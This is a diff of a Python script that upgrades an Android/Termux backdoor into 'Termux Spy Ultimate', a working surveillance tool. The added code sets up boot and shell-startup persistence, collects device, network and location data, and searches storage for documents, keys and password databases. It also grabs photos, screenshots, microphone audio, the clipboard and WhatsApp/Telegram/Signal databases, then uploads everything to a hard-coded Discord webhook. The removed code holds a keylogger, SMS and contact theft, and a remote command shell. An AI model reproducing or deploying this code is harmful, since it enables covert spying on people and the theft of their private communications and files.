@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-Android/Termux Infiltration Toolkit
-Multifunctional backdoor with Discord C2 for Termux environment
+Termux Spy Ultimate v2.0
+Complete Android surveillance toolkit with Discord webhook exfiltration
 """
 
 import os
@@ -19,115 +19,278 @@ import re
 import getpass
 import zipfile
 import io
+import mimetypes
 from pathlib import Path
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
-# ======= CONFIGURATION =======
-BOT_TOKEN = "RO1Scl3wbaP7VZwjTb6dX-Cbd96jjv7X"
-CHANNEL_ID = 1464337565787230345  # Your Discord channel ID
-HEARTBEAT_INTERVAL = 60  # seconds
-VICTIM_ID = hashlib.md5(socket.gethostname().encode()).hexdigest()[:8]
+# ======= WEBHOOK CONFIGURATION =======
+WEBHOOK_URL = "https://discord.com/api/webhooks/1427133756724084817/uVvQRILIYlg7ku1ZEfPJ69BpS1-WjRFwdyhBt7vbyLB_514MbGcaWPGnPft1riDqm7O0"
+VICTIM_ID = hashlib.md5((socket.gethostname() + str(time.time())).encode()).hexdigest()[:12]
 
-# ======= TERMUX SPECIFIC PATHS =======
+# ======= TERMUX PATHS =======
 TERMUX_PATHS = {
     'home': '/data/data/com.termux/files/home',
     'storage': '/data/data/com.termux/files/home/storage',
     'shared': '/data/data/com.termux/files/home/storage/shared',
     'downloads': '/data/data/com.termux/files/home/storage/shared/Download',
     'dcim': '/data/data/com.termux/files/home/storage/shared/DCIM',
+    'pictures': '/data/data/com.termux/files/home/storage/shared/Pictures',
+    'movies': '/data/data/com.termux/files/home/storage/shared/Movies',
+    'music': '/data/data/com.termux/files/home/storage/shared/Music',
     'whatsapp': '/data/data/com.termux/files/home/storage/shared/WhatsApp',
-    'telegram': '/data/data/com.termux/files/home/storage/shared/Telegram'
+    'telegram': '/data/data/com.termux/files/home/storage/shared/Telegram',
+    'signal': '/data/data/com.termux/files/home/storage/shared/Signal',
+    'documents': '/data/data/com.termux/files/home/storage/shared/Documents'
 }
 
-class TermuxInfiltrationTool:
+class TermuxUltimateSpy:
     def __init__(self):
         self.session = requests.Session()
         self.session.headers.update({
             'User-Agent': 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36'
         })
         self.running = True
+        self.webhook_queue = []
+        self.executor = ThreadPoolExecutor(max_workers=10)
         
-    def establish_persistence(self):
-        """Add persistence in Termux"""
+    def send_webhook(self, content=None, embed=None, files=None, username="Termux Spy"):
+        """Send data to Discord webhook with retry"""
         try:
-            # Add to bashrc
-            bashrc_path = os.path.join(TERMUX_PATHS['home'], '.bashrc')
-            current_file = os.path.abspath(__file__)
+            payload = {
+                'username': username,
+                'avatar_url': 'https://cdn-icons-png.flaticon.com/512/5968/5968520.png'
+            }
             
-            with open(bashrc_path, 'a') as f:
-                f.write(f'\n# Termux startup\n')
-                f.write(f'python3 {current_file} &\n')
-                f.write(f'cd ~\n')
+            if content:
+                payload['content'] = content
+            if embed:
+                payload['embeds'] = [embed]
             
-            # Create startup script
-            startup_script = os.path.join(TERMUX_PATHS['home'], '.termux/boot/startup.sh')
-            os.makedirs(os.path.dirname(startup_script), exist_ok=True)
+            response = None
+            if files:
+                response = self.session.post(WEBHOOK_URL, files=files, timeout=30)
+            else:
+                response = self.session.post(WEBHOOK_URL, json=payload, timeout=30)
             
-            with open(startup_script, 'w') as f:
-                f.write('#!/data/data/com.termux/files/usr/bin/bash\n')
-                f.write(f'python3 {current_file} > /dev/null 2>&1 &\n')
-            
-            subprocess.run(['chmod', '+x', startup_script])
-            return True
+            if response.status_code == 204 or response.status_code == 200:
+                return True
+            else:
+                print(f"[-] Webhook error: {response.status_code}")
+                return False
+                
         except Exception as e:
-            print(f"Persistence error: {e}")
+            print(f"[-] Send error: {e}")
             return False
     
-    def gather_system_info(self):
-        """Collect comprehensive Android/Termux information"""
+    def send_large_data(self, data, title, description=""):
+        """Send large data as multiple embeds/files"""
+        if len(data) > 2000:
+            # Split into chunks
+            chunks = [data[i:i+1900] for i in range(0, len(data), 1900)]
+            for i, chunk in enumerate(chunks):
+                embed = {
+                    'title': f"{title} (Part {i+1})",
+                    'description': f'```{chunk}```',
+                    'color': 0x5865F2,
+                    'timestamp': time.strftime('%Y-%m-%dT%H:%M:%SZ')
+                }
+                self.send_webhook(embed=embed)
+        else:
+            embed = {
+                'title': title,
+                'description': f'```{data}```',
+                'color': 0x5865F2,
+                'timestamp': time.strftime('%Y-%m-%dT%H:%M:%SZ')
+            }
+            self.send_webhook(embed=embed)
+    
+    def send_file_discord(self, file_path, filename=None):
+        """Send file directly to Discord"""
+        try:
+            if not os.path.exists(file_path):
+                return False
+            
+            file_size = os.path.getsize(file_path)
+            if file_size > 25 * 1024 * 1024:  # 25MB limit
+                print(f"[-] File too large: {file_size}")
+                return False
+            
+            if filename is None:
+                filename = os.path.basename(file_path)
+            
+            with open(file_path, 'rb') as f:
+                files = {
+                    'file': (filename, f.read())
+                }
+            
+            embed = {
+                'title': f'📁 File Uploaded: {filename}',
+                'description': f'Size: {file_size:,} bytes',
+                'color': 0x00FF00,
+                'timestamp': time.strftime('%Y-%m-%dT%H:%M:%SZ')
+            }
+            
+            return self.send_webhook(embed=embed, files={'file': (filename, files['file'][1])})
+            
+        except Exception as e:
+            print(f"[-] File send error: {e}")
+            return False
+    
+    def establish_persistence(self):
+        """Add multiple persistence methods"""
+        try:
+            # Method 1: .bashrc
+            bashrc = os.path.join(TERMUX_PATHS['home'], '.bashrc')
+            current_file = os.path.abspath(__file__)
+            
+            with open(bashrc, 'a') as f:
+                f.write(f'\n# Auto-start\n')
+                f.write(f'nohup python3 {current_file} --silent > /dev/null 2>&1 &\n')
+            
+            # Method 2: Termux boot script
+            boot_dir = os.path.join(TERMUX_PATHS['home'], '.termux/boot')
+            os.makedirs(boot_dir, exist_ok=True)
+            
+            boot_script = os.path.join(boot_dir, 'start_spy')
+            with open(boot_script, 'w') as f:
+                f.write('#!/data/data/com.termux/files/usr/bin/sh\n')
+                f.write(f'python3 {current_file} --silent &\n')
+            
+            subprocess.run(['chmod', '+x', boot_script])
+            
+            # Method 3: Cron job
+            cron_cmd = f'@reboot python3 {current_file} --silent'
+            subprocess.run(['crontab', '-l'], stdout=subprocess.PIPE)
+            
+            return True
+            
+        except Exception as e:
+            print(f"[-] Persistence error: {e}")
+            return False
+    
+    def gather_comprehensive_info(self):
+        """Gather ALL system information"""
         info = {
             'victim_id': VICTIM_ID,
             'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
-            'device': {}
+            'system': {},
+            'network': {},
+            'storage': {},
+            'packages': {},
+            'sensors': {},
+            'battery': {},
+            'location': {}
         }
         
         try:
-            # Basic system info
-            info['device']['hostname'] = socket.gethostname()
-            info['device']['user'] = getpass.getuser()
-            info['device']['platform'] = platform.platform()
+            # === SYSTEM INFO ===
+            info['system']['hostname'] = socket.gethostname()
+            info['system']['user'] = getpass.getuser()
+            info['system']['platform'] = platform.platform()
+            info['system']['processor'] = platform.processor()
             
-            # Android-specific info
+            # Android build info
             try:
-                build_props = '/system/build.prop'
-                if os.path.exists(build_props):
-                    with open(build_props, 'r', encoding='latin-1') as f:
-                        content = f.read()
-                        info['device']['android_version'] = re.search(r'ro\.build\.version\.release=([^\n]+)', content)
-                        info['device']['device_model'] = re.search(r'ro\.product\.model=([^\n]+)', content)
-                        info['device']['manufacturer'] = re.search(r'ro\.product\.manufacturer=([^\n]+)', content)
+                if os.path.exists('/system/build.prop'):
+                    with open('/system/build.prop', 'r', encoding='latin-1') as f:
+                        build_data = f.read()
+                        info['system']['android_version'] = re.search(r'ro\.build\.version\.release=([^\n]+)', build_data)
+                        info['system']['device_model'] = re.search(r'ro\.product\.model=([^\n]+)', build_data)
+                        info['system']['manufacturer'] = re.search(r'ro\.product\.manufacturer=([^\n]+)', build_data)
+                        info['system']['build_id'] = re.search(r'ro\.build\.id=([^\n]+)', build_data)
             except:
                 pass
             
-            # Network info
+            # === NETWORK INFO ===
             try:
-                result = subprocess.run(['termux-wifi-connectioninfo'], 
-                                      capture_output=True, text=True, timeout=5)
-                if result.returncode == 0:
-                    info['device']['wifi'] = json.loads(result.stdout)
+                # IP addresses
+                info['network']['hostname'] = socket.gethostname()
+                info['network']['local_ip'] = socket.gethostbyname(socket.gethostname())
+                
+                # Public IP
+                try:
+                    public_ip = requests.get('https://api.ipify.org', timeout=5).text
+                    info['network']['public_ip'] = public_ip
+                    
+                    # Get IP info
+                    ip_info = requests.get(f'https://ipinfo.io/{public_ip}/json', timeout=5).json()
+                    info['network']['location'] = ip_info
+                except:
+                    pass
+                
+                # WiFi info
+                try:
+                    wifi_result = subprocess.run(['termux-wifi-connectioninfo'], 
+                                               capture_output=True, text=True, timeout=5)
+                    if wifi_result.returncode == 0:
+                        info['network']['wifi'] = json.loads(wifi_result.stdout)
+                except:
+                    pass
+                
+                # Network interfaces
+                try:
+                    ifconfig = subprocess.run(['ifconfig'], capture_output=True, text=True)
+                    info['network']['interfaces'] = ifconfig.stdout[:1000]
+                except:
+                    pass
+                    
             except:
                 pass
             
-            # Storage info
+            # === STORAGE INFO ===
             try:
-                result = subprocess.run(['df', '-h'], capture_output=True, text=True)
-                info['device']['storage'] = result.stdout
+                df_result = subprocess.run(['df', '-h'], capture_output=True, text=True)
+                info['storage']['df'] = df_result.stdout
+                
+                du_result = subprocess.run(['du', '-sh', TERMUX_PATHS['shared']], 
+                                         capture_output=True, text=True)
+                info['storage']['shared_size'] = du_result.stdout
             except:
                 pass
             
-            # Installed packages
+            # === PACKAGES INFO ===
             try:
-                result = subprocess.run(['pkg', 'list-installed'], 
-                                      capture_output=True, text=True)
-                info['device']['packages'] = result.stdout[:2000]
+                pkg_list = subprocess.run(['pkg', 'list-installed'], 
+                                        capture_output=True, text=True)
+                info['packages']['installed'] = pkg_list.stdout[:3000]
+                
+                pip_list = subprocess.run(['pip', 'list'], 
+                                        capture_output=True, text=True)
+                info['packages']['pip'] = pip_list.stdout[:2000]
             except:
                 pass
             
-            # Location (if termux-location is installed)
+            # === SENSOR DATA ===
             try:
-                result = subprocess.run(['termux-location'], 
-                                      capture_output=True, text=True, timeout=10)
-                if result.returncode == 0:
-                    info['device']['location'] = json.loads(result.stdout)
+                sensor_result = subprocess.run(['termux-sensor'], 
+                                             capture_output=True, text=True, timeout=5)
+                if sensor_result.returncode == 0:
+                    info['sensors']['available'] = sensor_result.stdout
+            except:
+                pass
+            
+            # === BATTERY INFO ===
+            try:
+                battery_result = subprocess.run(['termux-battery-status'], 
+                                              capture_output=True, text=True, timeout=5)
+                if battery_result.returncode == 0:
+                    info['battery'] = json.loads(battery_result.stdout)
+            except:
+                pass
+            
+            # === LOCATION ===
+            try:
+                location_result = subprocess.run(['termux-location'], 
+                                               capture_output=True, text=True, timeout=10)
+                if location_result.returncode == 0:
+                    info['location'] = json.loads(location_result.stdout)
+            except:
+                pass
+            
+            # === RUNNING PROCESSES ===
+            try:
+                ps_result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
+                info['system']['processes'] = ps_result.stdout[:2000]
             except:
                 pass
             
@@ -136,451 +299,451 @@ class TermuxInfiltrationTool:
         
         return info
     
-    def exfiltrate_files(self, path_patterns=None, max_size=10485760):
-        """Find and exfiltrate sensitive files"""
-        if path_patterns is None:
-            path_patterns = [
-                '**/*.txt',
-                '**/*.pdf',
-                '**/*.doc*',
-                '**/*.xls*',
-                '**/*.jpg',
-                '**/*.jpeg',
-                '**/*.png',
-                '**/*.mp4',
-                '**/*.mp3',
-                '**/*.db',
-                '**/*.sqlite',
-                '**/passwords*',
-                '**/credentials*',
-                '**/*config*',
-                '**/*.env',
-                '**/secrets*'
+    def find_sensitive_files(self, extensions=None):
+        """Find files by extensions with parallel processing"""
+        if extensions is None:
+            extensions = [
+                '.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.csv', '.json',
+                '.jpg', '.jpeg', '.png', '.gif', '.mp4', '.avi', '.mov', '.mp3',
+                '.db', '.sqlite', '.sqlite3', '.xml', '.html', '.htm', '.zip',
+                '.rar', '.7z', '.apk', '.env', '.config', '.conf', '.ini',
+                '.sh', '.bash', '.zsh', '.history', '.log', '.key', '.pem',
+                '.crt', '.cer', '.p12', '.pfx', '.ovpn', '.kdbx'
             ]
         
-        collected_files = []
+        found_files = []
         
-        for storage_path in [TERMUX_PATHS['shared'], TERMUX_PATHS['downloads'], 
-                           TERMUX_PATHS['dcim'], TERMUX_PATHS['whatsapp'],
-                           TERMUX_PATHS['telegram']]:
-            if not os.path.exists(storage_path):
-                continue
-            
-            for pattern in path_patterns:
-                try:
-                    for file_path in Path(storage_path).glob(pattern):
-                        if file_path.is_file():
-                            file_size = file_path.stat().st_size
-                            if file_size < max_size and file_size > 0:
-                                try:
-                                    with open(file_path, 'rb') as f:
-                                        content = f.read()
-                                    
-                                    collected_files.append({
+        def scan_directory(dir_path):
+            local_files = []
+            if os.path.exists(dir_path):
+                for ext in extensions:
+                    try:
+                        for file_path in Path(dir_path).glob(f'**/*{ext}'):
+                            if file_path.is_file():
+                                file_size = file_path.stat().st_size
+                                if 100 <= file_size <= 10 * 1024 * 1024:  # 100 bytes to 10MB
+                                    local_files.append({
                                         'path': str(file_path),
-                                        'name': file_path.name,
                                         'size': file_size,
-                                        'content': base64.b64encode(content).decode('utf-8'),
-                                        'encoded': True
+                                        'ext': ext
                                     })
-                                    
-                                    # Limit to prevent memory issues
-                                    if len(collected_files) >= 20:
-                                        break
-                                except:
-                                    continue
+                    except:
+                        pass
+            return local_files
+        
+        # Scan all directories in parallel
+        futures = []
+        for path in TERMUX_PATHS.values():
+            futures.append(self.executor.submit(scan_directory, path))
+        
+        for future in as_completed(futures):
+            found_files.extend(future.result())
+        
+        # Sort by size (largest first)
+        found_files.sort(key=lambda x: x['size'], reverse=True)
+        return found_files[:100]  # Limit to 100 files
+    
+    def capture_media(self):
+        """Capture screenshots, photos, and videos"""
+        media_files = []
+        
+        try:
+            # Take screenshot using Termux API
+            try:
+                screenshot_path = os.path.join(TERMUX_PATHS['home'], 'screenshot.png')
+                result = subprocess.run(['termux-screenshot', '-p', screenshot_path],
+                                      capture_output=True, text=True, timeout=10)
+                
+                if os.path.exists(screenshot_path):
+                    media_files.append(('📸 Screenshot', screenshot_path))
+            except:
+                pass
+            
+            # Copy recent photos
+            dcim_path = TERMUX_PATHS['dcim']
+            if os.path.exists(dcim_path):
+                photos = list(Path(dcim_path).glob('**/*.jpg')) + list(Path(dcim_path).glob('**/*.png'))
+                photos.sort(key=lambda x: x.stat().st_mtime, reverse=True)
+                
+                for photo in photos[:5]:  # Latest 5 photos
+                    media_files.append(('📷 Photo', str(photo)))
+            
+            # Copy recent videos
+            movies_path = TERMUX_PATHS['movies']
+            if os.path.exists(movies_path):
+                videos = list(Path(movies_path).glob('**/*.mp4')) + list(Path(movies_path).glob('**/*.avi'))
+                videos.sort(key=lambda x: x.stat().st_mtime, reverse=True)
+                
+                for video in videos[:3]:  # Latest 3 videos
+                    media_files.append(('🎬 Video', str(video)))
+            
+        except Exception as e:
+            print(f"[-] Media capture error: {e}")
+        
+        return media_files
+    
+    def steal_communications(self):
+        """Extract WhatsApp, Telegram, Signal data"""
+        comm_data = {}
+        
+        apps = {
+            'WhatsApp': TERMUX_PATHS['whatsapp'],
+            'Telegram': TERMUX_PATHS['telegram'],
+            'Signal': TERMUX_PATHS['signal']
+        }
+        
+        for app_name, app_path in apps.items():
+            if os.path.exists(app_path):
+                try:
+                    # Find databases
+                    db_files = list(Path(app_path).glob('**/*.db')) + list(Path(app_path).glob('**/*.sqlite'))
+                    
+                    if db_files:
+                        comm_data[app_name] = {
+                            'database_count': len(db_files),
+                            'databases': [str(db) for db in db_files[:3]],
+                            'path': app_path
+                        }
+                        
+                        # Try to read basic info from first database
+                        if db_files:
+                            try:
+                                conn = sqlite3.connect(str(db_files[0]))
+                                cursor = conn.cursor()
+                                cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
+                                tables = cursor.fetchall()
+                                comm_data[app_name]['tables'] = [table[0] for table in tables[:10]]
+                                conn.close()
+                            except:
+                                pass
                 except:
                     pass
         
-        return collected_files
+        return comm_data
     
-    def execute_command(self, command, timeout=30):
-        """Execute shell command"""
+    def record_environment(self):
+        """Record audio and get clipboard"""
+        recordings = {}
+        
         try:
-            result = subprocess.run(
-                command,
-                shell=True,
-                capture_output=True,
-                text=True,
-                timeout=timeout,
-                cwd=TERMUX_PATHS['home']
-            )
+            # Record audio
+            audio_file = os.path.join(TERMUX_PATHS['home'], f'audio_{int(time.time())}.aac')
+            result = subprocess.run(['termux-microphone-record', '-f', audio_file, '-l', '15'],
+                                  capture_output=True, text=True, timeout=20)
             
-            return {
-                'success': result.returncode == 0,
-                'returncode': result.returncode,
-                'stdout': result.stdout,
-                'stderr': result.stderr,
-                'command': command
-            }
-        except subprocess.TimeoutExpired:
-            return {
-                'success': False,
-                'error': 'Timeout expired',
-                'command': command
-            }
-        except Exception as e:
-            return {
-                'success': False,
-                'error': str(e),
-                'command': command
-            }
-    
-    def take_screenshot(self):
-        """Take screenshot using Termux API"""
+            if os.path.exists(audio_file):
+                recordings['audio'] = audio_file
+        
+        except:
+            pass
+        
         try:
-            # Check if termux-api is installed
-            result = subprocess.run(['termux-screenshot'], 
+            # Get clipboard
+            result = subprocess.run(['termux-clipboard-get'],
                                   capture_output=True, text=True)
-            
-            if result.returncode == 0:
-                # Look for the screenshot file
-                screenshot_dir = TERMUX_PATHS['home']
-                screenshots = list(Path(screenshot_dir).glob('*.png'))
-                
-                if screenshots:
-                    latest = max(screenshots, key=lambda x: x.stat().st_mtime)
-                    with open(latest, 'rb') as f:
-                        return base64.b64encode(f.read()).decode('utf-8')
-            
-            return None
+            if result.stdout.strip():
+                recordings['clipboard'] = result.stdout[:500]
         except:
-            return None
+            pass
+        
+        return recordings
     
-    def record_audio(self, duration=10):
-        """Record audio using Termux API"""
-        try:
-            output_file = os.path.join(TERMUX_PATHS['home'], f'recording_{int(time.time())}.aac')
-            
-            result = subprocess.run(
-                ['termux-microphone-record', '-f', output_file, '-l', str(duration)],
-                capture_output=True,
-                text=True,
-                timeout=duration + 5
-            )
-            
-            if os.path.exists(output_file):
-                with open(output_file, 'rb') as f:
-                    audio_data = base64.b64encode(f.read()).decode('utf-8')
-                os.remove(output_file)
-                return audio_data
-            
-            return None
-        except:
-            return None
-    
-    def get_clipboard(self):
-        """Get clipboard content"""
-        try:
-            result = subprocess.run(['termux-clipboard-get'], 
-                                  capture_output=True, text=True)
-            return result.stdout.strip()
-        except:
-            return None
-    
-    def steal_sms(self):
-        """Extract SMS messages"""
-        try:
-            # This requires termux-api and permissions
-            result = subprocess.run(['termux-sms-list'], 
-                                  capture_output=True, text=True)
-            
-            if result.returncode == 0:
-                return json.loads(result.stdout)
-            return []
-        except:
-            return []
-    
-    def steal_contacts(self):
-        """Extract contacts"""
-        try:
-            result = subprocess.run(['termux-contact-list'], 
-                                  capture_output=True, text=True)
-            
-            if result.returncode == 0:
-                return json.loads(result.stdout)
-            return []
-        except:
-            return []
-    
-    def create_zip_archive(self, files_data):
-        """Create zip archive of collected files"""
+    def create_smart_zip(self, files):
+        """Create organized zip archive"""
         zip_buffer = io.BytesIO()
         
         with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
-            for file_data in files_data:
+            for file_info in files:
                 try:
-                    content = base64.b64decode(file_data['content'])
-                    zip_file.writestr(file_data['path'], content)
+                    file_path = file_info['path']
+                    if os.path.exists(file_path):
+                        with open(file_path, 'rb') as f:
+                            content = f.read()
+                        
+                        # Create organized path in zip
+                        rel_path = file_path.replace('/', '_').replace(' ', '_')
+                        zip_file.writestr(f"collected/{rel_path}", content)
                 except:
-                    pass
+                    continue
         
         zip_buffer.seek(0)
-        return base64.b64encode(zip_buffer.read()).decode('utf-8')
+        return zip_buffer
     
-    def send_to_discord(self, data, filename="data.json"):
-        """Send data to Discord webhook or bot"""
-        try:
-            # Create message
-            message = {
-                'victim_id': VICTIM_ID,
-                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
-                'data': data
-            }
-            
-            # Try to send via Discord bot (you'll need to implement this)
-            # For now, we'll just print it
-            print(f"[+] Data ready for exfiltration: {filename}")
-            print(json.dumps(message, indent=2)[:500] + "...")
-            
-            # Save locally for debugging
-            with open(f'/data/data/com.termux/files/home/{filename}', 'w') as f:
-                json.dump(message, f, indent=2)
-            
-            return True
-        except Exception as e:
-            print(f"[-] Discord send error: {e}")
-            return False
-    
-    def start_keylogger(self):
-        """Start simple keylogger for Termux"""
-        keylog_file = os.path.join(TERMUX_PATHS['home'], '.keylog.txt')
-        
-        def monitor_input():
-            try:
-                import select
-                import tty
-                import termios
-                
-                fd = sys.stdin.fileno()
-                old_settings = termios.tcgetattr(fd)
-                
-                try:
-                    tty.setraw(fd)
-                    
-                    while self.running:
-                        rlist, _, _ = select.select([sys.stdin], [], [], 0.1)
-                        if rlist:
-                            key = sys.stdin.read(1)
-                            with open(keylog_file, 'a') as f:
-                                f.write(key)
-                                if key == '\r' or key == '\n':
-                                    f.write('\n')
-                finally:
-                    termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
-            except:
-                pass
-        
-        keylog_thread = threading.Thread(target=monitor_input, daemon=True)
-        keylog_thread.start()
-        return keylog_file
-    
-    def run_surveillance(self):
-        """Main surveillance loop"""
-        print("[+] Starting Termux surveillance toolkit...")
+    def start_comprehensive_monitoring(self):
+        """Start full monitoring cycle"""
+        print(f"[+] Termux Spy Ultimate v2.0")
         print(f"[+] Victim ID: {VICTIM_ID}")
+        print(f"[+] Webhook: {WEBHOOK_URL[:50]}...")
         
-        # Establish persistence
-        if self.establish_persistence():
-            print("[+] Persistence established")
+        # Initial embed
+        embed = {
+            'title': '🚀 Termux Spy Ultimate - Connected',
+            'description': f'Victim ID: `{VICTIM_ID}`\nTimestamp: {time.strftime("%Y-%m-%d %H:%M:%S")}',
+            'color': 0x00FF00,
+            'thumbnail': {'url': 'https://cdn-icons-png.flaticon.com/512/5968/5968520.png'},
+            'fields': [
+                {'name': 'Status', 'value': '✅ Active', 'inline': True},
+                {'name': 'Device', 'value': socket.gethostname(), 'inline': True}
+            ]
+        }
+        self.send_webhook(embed=embed)
         
-        # Start keylogger
-        keylog_file = self.start_keylogger()
-        print("[+] Keylogger started")
-        
-        # Initial system info
-        print("[+] Gathering initial system information...")
-        system_info = self.gather_system_info()
-        self.send_to_discord(system_info, "system_info.json")
-        
-        # Heartbeat loop
-        heartbeat_count = 0
+        cycle_count = 0
         
         while self.running:
             try:
-                heartbeat_count += 1
+                cycle_count += 1
+                print(f"\n[+] Cycle #{cycle_count}")
                 
-                # Every 5 heartbeats, gather more data
-                if heartbeat_count % 5 == 0:
-                    # Gather files
-                    print("[+] Gathering sensitive files...")
-                    files = self.exfiltrate_files()
+                # === 1. SYSTEM INFO ===
+                if cycle_count % 3 == 1:
+                    print("[+] Gathering system information...")
+                    system_info = self.gather_comprehensive_info()
+                    
+                    # Send as file
+                    info_file = os.path.join(TERMUX_PATHS['home'], f'system_info_{cycle_count}.json')
+                    with open(info_file, 'w') as f:
+                        json.dump(system_info, f, indent=2)
+                    
+                    self.send_file_discord(info_file, "system_info.json")
+                    os.remove(info_file)
+                
+                # === 2. FIND FILES ===
+                if cycle_count % 2 == 0:
+                    print("[+] Searching for sensitive files...")
+                    files = self.find_sensitive_files()
                     
                     if files:
-                        zip_data = self.create_zip_archive(files)
-                        file_report = {
-                            'file_count': len(files),
-                            'total_size': sum(f['size'] for f in files),
-                            'files': [{'path': f['path'], 'size': f['size']} for f in files[:10]],
-                            'zip_archive': zip_data[:100] + "..." if len(zip_data) > 100 else zip_data
-                        }
-                        self.send_to_discord(file_report, "files_report.json")
-                
-                # Every 10 heartbeats, get keylog
-                if heartbeat_count % 10 == 0 and os.path.exists(keylog_file):
-                    try:
-                        with open(keylog_file, 'r') as f:
-                            keylog_content = f.read()[-5000:]  # Last 5000 chars
+                        # Create and send zip
+                        print(f"[+] Found {len(files)} files, creating zip...")
+                        zip_buffer = self.create_smart_zip(files[:20])  # First 20 files
                         
-                        if keylog_content:
-                            keylog_report = {
-                                'keylog_size': len(keylog_content),
-                                'content': keylog_content[-1000:]  # Last 1000 chars
-                            }
-                            self.send_to_discord(keylog_report, "keylog.json")
-                    except:
-                        pass
+                        zip_file_path = os.path.join(TERMUX_PATHS['home'], f'files_{cycle_count}.zip')
+                        with open(zip_file_path, 'wb') as f:
+                            f.write(zip_buffer.read())
+                        
+                        embed = {
+                            'title': f'📁 Files Collected - Cycle {cycle_count}',
+                            'description': f'Found **{len(files)}** files\nSending first 20 files...',
+                            'color': 0xFFA500,
+                            'fields': [
+                                {'name': 'Total Files', 'value': str(len(files)), 'inline': True},
+                                {'name': 'Total Size', 'value': f'{sum(f["size"] for f in files[:20]) / 1024 / 1024:.2f} MB', 'inline': True}
+                            ]
+                        }
+                        self.send_webhook(embed=embed)
+                        self.send_file_discord(zip_file_path, f"files_{cycle_count}.zip")
+                        os.remove(zip_file_path)
                 
-                # Send heartbeat
-                heartbeat = {
-                    'victim_id': VICTIM_ID,
-                    'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
-                    'heartbeat': heartbeat_count,
-                    'status': 'active'
+                # === 3. CAPTURE MEDIA ===
+                if cycle_count % 4 == 0:
+                    print("[+] Capturing media...")
+                    media_files = self.capture_media()
+                    
+                    for media_type, media_path in media_files:
+                        if os.path.exists(media_path):
+                            filename = f"{media_type.replace(' ', '_')}_{cycle_count}{os.path.splitext(media_path)[1]}"
+                            self.send_file_discord(media_path, filename)
+                
+                # === 4. COMMUNICATIONS ===
+                if cycle_count % 5 == 0:
+                    print("[+] Extracting communications data...")
+                    comm_data = self.steal_communications()
+                    
+                    if comm_data:
+                        comm_file = os.path.join(TERMUX_PATHS['home'], f'communications_{cycle_count}.json')
+                        with open(comm_file, 'w') as f:
+                            json.dump(comm_data, f, indent=2)
+                        
+                        embed = {
+                            'title': '💬 Communications Data',
+                            'description': f'Found data from {len(comm_data)} apps',
+                            'color': 0x9B59B6,
+                            'fields': []
+                        }
+                        
+                        for app, data in comm_data.items():
+                            embed['fields'].append({
+                                'name': app,
+                                'value': f'{data.get("database_count", 0)} databases',
+                                'inline': True
+                            })
+                        
+                        self.send_webhook(embed=embed)
+                        self.send_file_discord(comm_file, "communications.json")
+                        os.remove(comm_file)
+                
+                # === 5. RECORDINGS ===
+                if cycle_count % 6 == 0:
+                    print("[+] Recording environment...")
+                    recordings = self.record_environment()
+                    
+                    if 'audio' in recordings:
+                        self.send_file_discord(recordings['audio'], f"recording_{cycle_count}.aac")
+                        os.remove(recordings['audio'])
+                    
+                    if 'clipboard' in recordings:
+                        embed = {
+                            'title': '📋 Clipboard Content',
+                            'description': f'```{recordings["clipboard"]}```',
+                            'color': 0x3498DB
+                        }
+                        self.send_webhook(embed=embed)
+                
+                # === HEARTBEAT ===
+                embed = {
+                    'title': f'💓 Heartbeat - Cycle {cycle_count}',
+                    'description': f'**Victim ID:** `{VICTIM_ID}`\n**Time:** {time.strftime("%H:%M:%S")}',
+                    'color': 0x5865F2,
+                    'footer': {'text': 'Termux Spy Ultimate - Active'}
                 }
+                self.send_webhook(embed=embed)
                 
-                print(f"[+] Heartbeat #{heartbeat_count}")
-                self.send_to_discord(heartbeat, "heartbeat.json")
-                
-                # Sleep
-                time.sleep(HEARTBEAT_INTERVAL)
+                print(f"[+] Cycle {cycle_count} completed")
+                time.sleep(300)  # 5 minutes between cycles
                 
             except KeyboardInterrupt:
                 print("\n[!] Shutting down...")
                 self.running = False
                 break
             except Exception as e:
-                print(f"[-] Error in surveillance loop: {e}")
-                time.sleep(HEARTBEAT_INTERVAL)
+                print(f"[-] Cycle error: {e}")
+                time.sleep(60)
     
-    def interactive_mode(self):
-        """Interactive command mode"""
-        print("\n" + "="*50)
-        print("Termux Infiltration Toolkit - Interactive Mode")
-        print("="*50)
-        print("Commands:")
-        print("  info     - Show system information")
-        print("  files    - Collect sensitive files")
-        print("  cmd      - Execute shell command")
-        print("  screenshot - Take screenshot")
-        print("  audio    - Record audio")
-        print("  sms      - Extract SMS")
-        print("  contacts - Extract contacts")
-        print("  clipboard - Get clipboard")
-        print("  keylog   - Show keylog")
-        print("  exit     - Exit")
+    def quick_exfiltration(self):
+        """Quick one-time data exfiltration"""
+        print("[+] Starting quick exfiltration...")
         
-        while True:
-            try:
-                command = input("\n[termux-spy] $ ").strip().lower()
-                
-                if command == 'exit':
-                    self.running = False
-                    break
-                elif command == 'info':
-                    info = self.gather_system_info()
-                    print(json.dumps(info, indent=2))
-                elif command == 'files':
-                    files = self.exfiltrate_files()
-                    print(f"Found {len(files)} files")
-                    for f in files[:5]:
-                        print(f"  {f['path']} ({f['size']} bytes)")
-                elif command.startswith('cmd '):
-                    cmd = command[4:]
-                    result = self.execute_command(cmd)
-                    print(f"Return code: {result['returncode']}")
-                    print(f"Output:\n{result['stdout']}")
-                    if result['stderr']:
-                        print(f"Error:\n{result['stderr']}")
-                elif command == 'screenshot':
-                    screenshot = self.take_screenshot()
-                    if screenshot:
-                        print(f"Screenshot taken (size: {len(screenshot)} bytes)")
-                    else:
-                        print("Failed to take screenshot")
-                elif command.startswith('audio '):
-                    try:
-                        duration = int(command.split()[1])
-                        audio = self.record_audio(duration)
-                        if audio:
-                            print(f"Audio recorded (size: {len(audio)} bytes)")
-                        else:
-                            print("Failed to record audio")
-                    except:
-                        print("Usage: audio [duration_seconds]")
-                elif command == 'sms':
-                    sms = self.steal_sms()
-                    print(f"Found {len(sms)} SMS messages")
-                    for msg in sms[:3]:
-                        print(f"  From: {msg.get('number', 'N/A')}")
